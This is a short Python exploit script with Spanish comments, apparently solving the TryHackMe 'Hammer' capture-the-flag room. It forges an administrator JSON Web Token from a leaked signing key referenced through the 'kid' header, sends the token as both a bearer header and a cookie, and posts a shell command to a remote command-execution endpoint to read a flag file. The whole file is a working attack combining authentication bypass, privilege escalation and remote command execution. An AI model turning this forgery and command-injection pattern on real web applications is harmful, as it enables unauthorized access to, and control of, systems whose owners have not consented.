import jwt
import requests
import json
import time

# --- CONFIGURACIÓN ---
# IP de tu instancia de TryHackMe
TARGET_IP = "10.81.136.11" 
URL = f"http://{TARGET_IP}:1337/execute_command.php"
# Secreto obtenido del archivo 188ade1.key
SECRET = "56058354efb3daa97ebab00fabd7a7d7" 
# Ruta absoluta del archivo de la llave en el servidor
KID = "/var/www/html/188ade1.key" 

def pwn():
    # 1. FORJAR EL TOKEN DE ADMINISTRADOR
    now = int(time.time())
    header = {"typ": "JWT", "alg": "HS256", "kid": KID}
    payload = {
        "iss": "http://hammer.thm",
        "aud": "http://hammer.thm",
        "iat": now,
        "exp": now + 3600,
        "data": {
            "user_id": 1,
            "email": "tester@hammer.thm",
            "role": "admin" # Escalada de privilegios
        }
    }

    token = jwt.encode(payload, SECRET, algorithm="HS256", headers=header)
    print(f"[*] Admin Token forged: {token[:50]}...")

    # 2. CONFIGURAR CABECERAS Y COOKIES (EL SECRETO DEL ÉXITO)
    # El servidor exige el token tanto en Authorization como en la Cookie 'token'
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    cookies = {
        "token": token
    }
    
    # 3. EJECUTAR EL COMANDO PARA LA FLAG FINAL
    data = {"command": "cat /home/ubuntu/flag.txt"}

    print(f"[*] Solicitando la flag final en /home/ubuntu/flag.txt...")
    response = requests.post(URL, headers=headers, cookies=cookies, data=json.dumps(data))

    if response.status_code == 200:
        try:
            result = response.json()
            print("\n" + "="*40)
            print(f"🚩 FLAG FINAL: {result.get('output').strip()}")
            print("="*40)
        except:
            print("[!] Error: El servidor no devolvió JSON. Revisa la IP.")
    else:
        print(f"[!] Error HTTP {response.status_code}. Posible sesión expirada.")

if __name__ == "__main__":
    pwn()